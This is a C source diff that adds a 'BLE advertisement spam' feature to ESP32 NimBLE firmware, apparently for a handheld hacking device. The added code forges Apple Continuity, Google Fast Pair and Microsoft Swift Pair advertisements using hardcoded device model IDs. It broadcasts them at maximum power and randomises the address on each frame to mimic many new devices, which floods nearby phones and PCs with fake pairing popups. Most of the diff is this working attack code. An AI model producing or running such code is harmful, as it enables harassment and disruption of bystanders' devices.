@@ -16,13 +16,17 @@
 #include "at_custom_hid_cmd.h"
 #include "esp_err.h"
 #include "esp_log.h"
+#include "esp_random.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "host/ble_gap.h"
 #include "host/ble_hs.h"
 #include "host/ble_hs_adv.h"
+#include "host/ble_hs_mbuf.h"
 #include "host/ble_store.h"
 #include "host/ble_uuid.h"
+#include "nimble/hci_common.h"
+#include "os/os_mbuf.h"
 #include "nimble/nimble_port.h"
 #include "nimble/nimble_port_freertos.h"
 #include "services/gap/ble_svc_gap.h"
@@ -50,6 +54,19 @@ static uint16_t s_ble_conn_handle = BLE_HS_CONN_HANDLE_NONE;
 static ble_scan_result_t s_ble_scan_results[BLE_SCAN_MAX_RESULTS];
 static uint16_t s_ble_scan_count = 0;
 static char s_adv_name[BLE_SCAN_NAME_MAX + 1] = "M1-BLE";
+
+/* ── BLE advertisement spam ───────────────────────────────────── */
+
+#define BLE_SPAM_APPLE   0x01
+#define BLE_SPAM_GOOGLE  0x02
+#define BLE_SPAM_MS      0x04
+#define BLE_SPAM_ALL     (BLE_SPAM_APPLE | BLE_SPAM_GOOGLE | BLE_SPAM_MS)
+
+static TaskHandle_t s_ble_spam_task = NULL;
+static volatile bool s_ble_spam_stop = false;
+static uint8_t s_ble_spam_mode = 0;
+
+static void ble_spam_stop_locked(void);
 
 void ble_store_config_init(void);
 
@@ -224,6 +241,7 @@ static void ble_on_reset(int reason)
     s_ble_conn_handle = BLE_HS_CONN_HANDLE_NONE;
     s_ble_scan_active = false;
     s_ble_adv_active = false;
+    s_ble_spam_stop = true;
 }
 
 static m1_status_t ensure_ble_ready(void)
@@ -276,6 +294,7 @@ static m1_status_t cmd_ble_init(const uint8_t *payload, uint16_t len)
     }
 
     if (payload[0] == 0) {
+        ble_spam_stop_locked();
         if (s_ble_scan_active) {
             ble_gap_disc_cancel();
             s_ble_scan_active = false;
@@ -489,6 +508,257 @@ static m1_status_t cmd_ble_disconnect(const uint8_t *payload, uint16_t len)
     return M1_ERR_NOT_RUNNING;
 }
 
+/* ── BLE spam payload builders ────────────────────────────────────
+ * Each builds a single legacy advertising payload (<= 31 bytes) for a
+ * vendor "device nearby" popup, returning the byte length.
+ */
+
+/* Apple Continuity "proximity pairing" (AirPods/Beats popup). */
+static const uint8_t s_apple_models[][2] = {
+    {0x0E, 0x20}, /* AirPods Pro */
+    {0x0A, 0x20}, /* AirPods Max */
+    {0x0F, 0x20}, /* AirPods 2nd gen */
+    {0x13, 0x20}, /* AirPods 3rd gen */
+    {0x14, 0x20}, /* AirPods Pro 2 */
+    {0x0B, 0x20}, /* Beats Solo Pro */
+    {0x11, 0x20}, /* Beats Studio Buds */
+    {0x20, 0x20}, /* Beats Fit Pro */
+};
+
+static int build_apple_adv(uint8_t *adv)
+{
+    int n = sizeof(s_apple_models) / sizeof(s_apple_models[0]);
+    const uint8_t *m = s_apple_models[esp_random() % n];
+    int i = 0;
+    adv[i++] = 0x1E;            /* length (30) */
+    adv[i++] = 0xFF;            /* manufacturer specific data */
+    adv[i++] = 0x4C;            /* Apple company ID (LE) */
+    adv[i++] = 0x00;
+    adv[i++] = 0x07;            /* continuity type: proximity pairing */
+    adv[i++] = 0x19;            /* payload length (25) */
+    adv[i++] = 0x07;            /* prefix */
+    adv[i++] = m[0];            /* device model */
+    adv[i++] = m[1];
+    adv[i++] = 0x55;            /* status */
+    adv[i++] = (uint8_t)(esp_random() & 0x7F); /* buds battery */
+    adv[i++] = (uint8_t)(esp_random() & 0x7F); /* case battery */
+    adv[i++] = (uint8_t)(esp_random() & 0xFF); /* lid open count */
+    adv[i++] = 0x00;            /* device colour */
+    adv[i++] = 0x00;
+    for (int k = 0; k < 16; k++) {
+        adv[i++] = (uint8_t)esp_random(); /* random encrypted tail */
+    }
+    return i; /* 31 */
+}
+
+/* Google Fast Pair "device nearby" popup. */
+static const uint8_t s_google_models[][3] = {
+    {0xCD, 0x82, 0x56},
+    {0x0E, 0x30, 0xA0},
+    {0xF5, 0x29, 0x56},
+    {0x92, 0xBB, 0xBD},
+    {0xD4, 0x46, 0xA0},
+    {0x00, 0x00, 0x07},
+};
+
+static int build_google_adv(uint8_t *adv)
+{
+    int n = sizeof(s_google_models) / sizeof(s_google_models[0]);
+    const uint8_t *m = s_google_models[esp_random() % n];
+    int i = 0;
+    adv[i++] = 0x03;            /* len */
+    adv[i++] = 0x03;            /* complete list of 16-bit service UUIDs */
+    adv[i++] = 0x2C;            /* 0xFE2C Fast Pair (LE) */
+    adv[i++] = 0xFE;
+    adv[i++] = 0x06;            /* len */
+    adv[i++] = 0x16;            /* service data, 16-bit UUID */
+    adv[i++] = 0x2C;            /* 0xFE2C */
+    adv[i++] = 0xFE;
+    adv[i++] = m[0];            /* model ID */
+    adv[i++] = m[1];
+    adv[i++] = m[2];
+    adv[i++] = 0x02;            /* len */
+    adv[i++] = 0x0A;            /* TX power level */
+    adv[i++] = (uint8_t)(esp_random() % 0x0A);
+    return i;
+}
+
+/* Microsoft Swift Pair "add a device" popup. */
+static int build_ms_adv(uint8_t *adv)
+{
+    int i = 0;
+    adv[i++] = 0x00;            /* length placeholder (patched below) */
+    adv[i++] = 0xFF;            /* manufacturer specific data */
+    adv[i++] = 0x06;            /* Microsoft company ID (LE) */
+    adv[i++] = 0x00;
+    adv[i++] = 0x03;            /* Swift Pair beacon sub-scenario */
+    adv[i++] = 0x00;            /* reserved */
+    adv[i++] = 0x80;            /* reserved / flags */
+    for (int k = 0; k < 4; k++) {
+        adv[i++] = (uint8_t)('A' + (esp_random() % 26)); /* display name */
+    }
+    adv[0] = (uint8_t)(i - 1);  /* length excludes the length byte itself */
+    return i;
+}
+
+/* This build enables CONFIG_BT_NIMBLE_EXT_ADV, so the legacy ble_gap_adv_*
+ * API returns BLE_HS_ENOTSUP at runtime. Advertising must go through the
+ * extended-advertising API, using a legacy-format PDU so ordinary phones
+ * still see the frames during a passive scan. */
+#define BLE_SPAM_ADV_INSTANCE 0
+
+static int ble_spam_ext_configure(void)
+{
+    struct ble_gap_ext_adv_params p = {0};
+    p.legacy_pdu = 1;        /* legacy-format, non-connectable beacon */
+    p.connectable = 0;
+    p.scannable = 0;
+    p.own_addr_type = BLE_OWN_ADDR_RANDOM;
+    p.primary_phy = BLE_HCI_LE_PHY_1M;
+    p.secondary_phy = BLE_HCI_LE_PHY_1M;
+    p.itvl_min = 0x20;
+    p.itvl_max = 0x20;
+    p.tx_power = 127;
+    return ble_gap_ext_adv_configure(BLE_SPAM_ADV_INSTANCE, &p, NULL,
+                                     ble_gap_event_cb, NULL);
+}
+
+static void ble_spam_task_func(void *arg)
+{
+    (void)arg;
+    uint8_t adv[31];
+    uint8_t modes[3];
+    int nmodes = 0;
+    int idx = 0;
+    bool configured = false;
+
+    if (s_ble_spam_mode & BLE_SPAM_APPLE)  modes[nmodes++] = BLE_SPAM_APPLE;
+    if (s_ble_spam_mode & BLE_SPAM_GOOGLE) modes[nmodes++] = BLE_SPAM_GOOGLE;
+    if (s_ble_spam_mode & BLE_SPAM_MS)     modes[nmodes++] = BLE_SPAM_MS;
+    if (nmodes == 0) modes[nmodes++] = BLE_SPAM_APPLE;
+
+    while (!s_ble_spam_stop) {
+        uint8_t mode = modes[idx++ % nmodes];
+        struct os_mbuf *om;
+        ble_addr_t rnd;
+        int len = 0;
+
+        switch (mode) {
+        case BLE_SPAM_APPLE:  len = build_apple_adv(adv);  break;
+        case BLE_SPAM_GOOGLE: len = build_google_adv(adv); break;
+        case BLE_SPAM_MS:     len = build_ms_adv(adv);     break;
+        default: break;
+        }
+        if (len <= 0) {
+            vTaskDelay(pdMS_TO_TICKS(20));
+            continue;
+        }
+
+        /* Stop the instance so we can rotate address + data. */
+        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+
+        if (!configured) {
+            if (ble_spam_ext_configure() != 0) {
+                vTaskDelay(pdMS_TO_TICKS(50));
+                continue;
+            }
+            configured = true;
+        }
+
+        /* Fresh random static address each frame -> looks like a new device. */
+        rnd.type = BLE_ADDR_RANDOM;
+        for (int k = 0; k < 6; k++) rnd.val[k] = (uint8_t)esp_random();
+        rnd.val[5] |= 0xC0; /* static random address: top two bits set */
+        ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd);
+
+        om = ble_hs_mbuf_from_flat(adv, (uint16_t)len);
+        if (!om) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+            continue;
+        }
+        if (ble_gap_ext_adv_set_data(BLE_SPAM_ADV_INSTANCE, om) != 0) {
+            os_mbuf_free_chain(om);
+            vTaskDelay(pdMS_TO_TICKS(10));
+            continue;
+        }
+        ble_gap_ext_adv_start(BLE_SPAM_ADV_INSTANCE, 0, 0);
+        vTaskDelay(pdMS_TO_TICKS(40));
+    }
+
+    ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+    if (configured) {
+        ble_gap_ext_adv_remove(BLE_SPAM_ADV_INSTANCE);
+    }
+    s_ble_adv_active = false;
+    s_ble_spam_task = NULL;
+    vTaskDelete(NULL);
+}
+
+static void ble_spam_stop_locked(void)
+{
+    if (!s_ble_spam_task) return;
+    s_ble_spam_stop = true;
+    int retry = 40;
+    while (s_ble_spam_task != NULL && retry-- > 0) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+    s_ble_spam_task = NULL;
+    s_ble_spam_stop = false;
+}
+
+static m1_status_t cmd_ble_spam_start(const uint8_t *payload, uint16_t len)
+{
+    uint8_t mode = (len >= 1) ? payload[0] : BLE_SPAM_ALL;
+
+    m1_status_t status = ensure_ble_ready();
+    if (status != M1_OK) {
+        return status;
+    }
+    if (s_ble_spam_task) {
+        return M1_ERR_ALREADY_RUNNING;
+    }
+    if (mode == 0) mode = BLE_SPAM_ALL;
+    s_ble_spam_mode = mode & BLE_SPAM_ALL;
+
+    /* Free the radio: stop any scan/advertise already running. */
+    if (s_ble_scan_active) {
+        ble_gap_disc_cancel();
+        s_ble_scan_active = false;
+    }
+    if (s_ble_adv_active) {
+        ble_gap_adv_stop();
+        s_ble_adv_active = false;
+    }
+
+    s_ble_spam_stop = false;
+    if (xTaskCreate(ble_spam_task_func, "m1blespam", 4096, NULL, 5,
+                    &s_ble_spam_task) != pdPASS) {
+        s_ble_spam_task = NULL;
+        return M1_ERR_NO_MEM;
+    }
+    return M1_OK;
+}
+
+static m1_status_t cmd_ble_spam_stop(void)
+{
+    if (!s_ble_spam_task) {
+        return M1_ERR_NOT_RUNNING;
+    }
+    ble_spam_stop_locked();
+    return M1_OK;
+}
+
+/* Public entry points for the AT command layer. */
+m1_status_t m1_ble_spam_start(uint8_t mode)
+{
+    return cmd_ble_spam_start(&mode, 1);
+}
+
+m1_status_t m1_ble_spam_stop(void)
+{
+    return cmd_ble_spam_stop();
+}
+
 m1_status_t m1_rpc_ble_handler(uint16_t msg_id,
                                const uint8_t *payload,
                                uint16_t payload_len,
@@ -522,6 +792,12 @@ m1_status_t m1_rpc_ble_handler(uint16_t msg_id,
     case M1_MSG_BLE_DISCONNECT:
         *resp_len = 0;
         return cmd_ble_disconnect(payload, payload_len);
+    case M1_MSG_BLE_SPAM_START:
+        *resp_len = 0;
+        return cmd_ble_spam_start(payload, payload_len);
+    case M1_MSG_BLE_SPAM_STOP:
+        *resp_len = 0;
+        return cmd_ble_spam_stop();
     default:
         *resp_len = 0;
         return M1_ERR_UNSUPPORTED;
